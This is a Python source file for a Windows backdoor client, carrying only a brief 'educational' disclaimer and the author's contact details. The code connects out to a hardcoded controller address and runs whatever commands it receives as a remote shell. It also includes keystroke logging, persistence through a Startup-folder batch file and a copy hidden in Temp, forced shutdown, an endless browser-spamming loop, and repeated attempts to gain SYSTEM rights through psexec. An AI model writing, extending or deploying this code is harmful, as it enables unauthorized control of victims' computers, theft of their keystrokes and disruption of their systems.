# legal disclamer:
#it's just for educational things
#test it just in system your have permissions to use that program
#rememenber, with powers come big responsabilitys. ass: Rossini135
#contact infos: 
#email: rossiniroberto52@gmail.com
#twitter: @rossin135

#github: https://github.com/rossiniroberto52/backdoor.git
import socket, os, subprocess, webbrowser, shutil, winreg, ctypes, time, random
from PIL import ImageGrab
from pynput.keyboard import Key as key
from pynput.keyboard import Listener
from getpass import getuser
from pathlib import Path
from os import path
from sys import argv

os.system("cls")

#conn vars
IP = "192.168.0.3"
PORT = 6667

#most used vars
USER = getuser()

#used PATHS:
temp_path = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER

keys = []

def functionPK(key):
    keys.append(key)
    storeKeysToFile(keys)

#def screenshot():
#    arquive = ImageGrab.grab().save("screenshot.png", "PNG")
#    filename = "screenshot.png"
#    conn.send(filename.encode("utf-8"))
#    file = open(arquive, 'rb')
#    with open(file, 'rb') as img:
#        data = img.read(1024)
#        if not data:
#            conn.send("error to take or send a picture in victim machine!".encode("utf-8"))
#        conn.sendall(data)
    

def storeKeysToFile(keys):   
    with open('keylog.txt', 'w') as log:  
        for the_key in keys:   
            the_key = str(the_key).replace("'", " ")  
            log.write(the_key)  

def kill():
    os.system("msg %username% have a nice day and good luck fixing this pc")
    os.system("shutdown -s -t 3")

def clone():
    try:
        path_to_create = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
        if not os.path.exists(path_to_create):
            os.makedirs(path_to_create)
        fileToCopy = 'clt.exe'
        shutil.copy2(fileToCopy, path_to_create)
    except:
        msg = "error to create\copy...."
        conn.send(msg.encode("utf-8"))
        pass

def get_banner():
    s = socket.socket()
    s.connect(('google.com',80))
    s.send(b'GET/\n\n')
    conn.send(s.recv(1024))
    s.close()

def bat_create(file_path=""):
    if(file_path == ""):
        file_path = temp_path
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start /b %s\\clt.exe' % file_path)
        msg = "[+] .bat file created!"
        conn.send(msg.encode("utf-8"))

#working process

#develop-in
def giving_root():
    while True:
        retorno = ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe", u"-accepteula -nobanner -s -d " + temp_path + "\\clt.exe", None, 0)
        if retorno == 42:
           break
    time.sleep(random.randint(1,11))

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((IP,PORT))

while True:
    cmd = conn.recv(1024).decode('utf-8')
    if cmd == "/help":
        print("help menu\n commands: \n exit: break the connection with the target\n kill: open infinity tabs with a rick roll meme and crash the pc (not forever) \n stay: make a copy of this backdoor for a paste in tmp arquives (read the docs(in progress) \n banner: get somme infos about the device \n Kstay: a mix of the function stay and kill \n keylog(in progress): registy any keys typed in the keyboard \n help: open this menu")
    if cmd == "/exit":
        break
    if cmd == "/kill":
        kill()
    #if cmd == "/screenlog":
    #    screenshot()
    if cmd == "/troll":
        link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        while True:
            os.system("msg %username% lol")
            webbrowser.open_new(link)
    if cmd == "/stay":
        bat_create()
        clone()
        #re-start the server
    if cmd == "/banner":
        get_banner()
    if cmd == "/Kstay":
        bat_create()
        clone()
        kill()
        # Kstay shutdown the sistem. stay dont shutdown
        #re-start the server
    if cmd == "/keylog":
        with Listener(on_press = functionPK) as the_listener:  
            the_listener.join()
    if cmd == "/root":
        giving_root()
    os.system(cmd)
    output = subprocess.getoutput(cmd)
    conn.send(output.encode('utf-8'))
    os.system("cls")
os.system("cls")
conn.close()
exit()